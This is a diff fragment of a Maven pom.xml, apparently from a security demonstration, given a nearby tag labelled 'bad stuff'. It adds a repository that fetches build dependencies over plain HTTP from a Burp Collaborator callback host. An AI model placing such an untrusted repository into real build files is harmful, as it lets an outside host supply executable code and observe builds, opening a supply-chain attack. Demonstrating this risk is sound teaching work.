@@ -13,6 +13,13 @@
 		<maven.compiler.target>1.8</maven.compiler.target>
 	</properties>
 
+<repositories>
+   <repository>
+       <id>org.source.repo</id>
+       <url>http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/</url>
+   </repository>
+</repositories>
+
 	<dependencies>
 		<!-- tag::bad stuff[] -->
 		<dependency>
